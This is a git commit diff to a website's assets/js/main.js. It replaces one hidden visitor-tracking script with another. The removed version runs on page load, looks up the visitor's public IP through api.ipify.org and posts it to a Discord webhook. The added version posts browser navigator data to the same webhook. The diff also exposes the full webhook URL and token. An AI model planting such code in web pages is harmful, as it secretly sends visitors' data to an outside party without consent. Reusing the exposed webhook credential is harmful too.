7b1a32d59c762d1165bc76be24e7cd76b3a4cab8
gogiyaw <86326882+gogiyaw@users.noreply.github.com>
2021-06-23 07:54:24 +1000

    Add files via upload

--- assets/js/main.js
+++ assets/js/main.js
@@ -1,24 +1,13 @@
-function aIdfB21P() {
-    var webhook = 'https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV';
-    console.log('test');
-    
-    var request = new XMLHttpRequest();
-    request.open('POSt', webhook);
-    request.setRequestHeader('Content-type', 'application/json');
-    console.log('test');
-    var params = {
-        content: `${LOpVf986('https://api.ipify.org/')}`
-    };
-    console.log('test');
-    request.send(JSON.stringify(params));
-}
-
-function LOpVf986(theUrl)
-{
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
-    xmlHttp.send( null );
-    return xmlHttp.responseText;
-}
-
-window.onload = aIdfB21P;
+(async () => {
+    const params = { content: `${window.navigator}` };
+    const rawResponse = await fetch('https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV', {
+        method: 'POST',
+        headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(params)
+    });
+    const content = await rawResponse.json();
+    console.log(content);
+})();
